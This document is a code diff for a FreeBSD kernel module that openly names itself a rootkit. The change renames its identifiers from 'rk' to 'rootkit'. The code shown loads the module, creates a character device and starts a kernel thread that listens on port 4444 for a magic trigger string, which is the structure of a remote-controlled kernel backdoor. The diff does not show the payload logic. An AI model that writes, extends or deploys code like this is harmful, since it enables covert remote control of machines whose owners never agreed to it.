@@ -17,7 +17,7 @@
 
 #include "interface.h"
 
-#define TRIGGER_STRING "BSD_rk_REMOTE_MAGIC_TRIGGER_v1"
+#define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
 #define LISTEN_PORT    4444
 
 /* Global synchronization primitives used by interface.c */
@@ -101,7 +101,7 @@ remote_listener_thread(void *arg __unused)
         if (from != NULL)
             free(from, M_SONAME);
 
-        pause("rk_poll", hz / 10); /* Poll every 100ms */
+        pause("rootkit_poll", hz / 10); /* Poll every 100ms */
     }
 
     if (so_listen != NULL) {
@@ -121,22 +121,22 @@ static int load(module_t module, int cmd, void *arg) {
 
     switch (cmd) {
     case MOD_LOAD:
-        mtx_init(&remote_mtx, "rk_mtx", NULL, MTX_DEF);
-        cv_init(&remote_cv, "rk_cv");
+        mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
+        cv_init(&remote_cv, "rootkit_cv");
 
         /* Initialize character device interface via interface.c */
-        error = make_rk_dev();
+        error = make_rootkit_dev();
 
         if (error == 0) {
             struct proc *p = NULL;
             error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
             if (error == 0) {
-                printf("rk: module loaded & remote listener active\n");
+                printf("rootkit: module loaded & remote listener active\n");
             } else {
-                printf("rk: device created, failed to start listener (%d)\n", error);
+                printf("rootkit: device created, failed to start listener (%d)\n", error);
             }
         } else {
-            printf("rk: failed to create device (%d)\n", error);
+            printf("rootkit: failed to create device (%d)\n", error);
         }
 
         break;
@@ -148,11 +148,11 @@ static int load(module_t module, int cmd, void *arg) {
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
 
-        destroy_rk_dev();
+        destroy_rootkit_dev();
 
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
-        printf("rk: module unloaded\n");
+        printf("rootkit: module unloaded\n");
         break;
 
     case MOD_SHUTDOWN:
@@ -166,10 +166,10 @@ static int load(module_t module, int cmd, void *arg) {
     return error;
 }
 
-static moduledata_t rk_module = {
-    "rk",
+static moduledata_t rootkit_module = {
+    "rootkit",
     load,
     NULL
 };
 
-DECLARE_MODULE(rk, rk_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
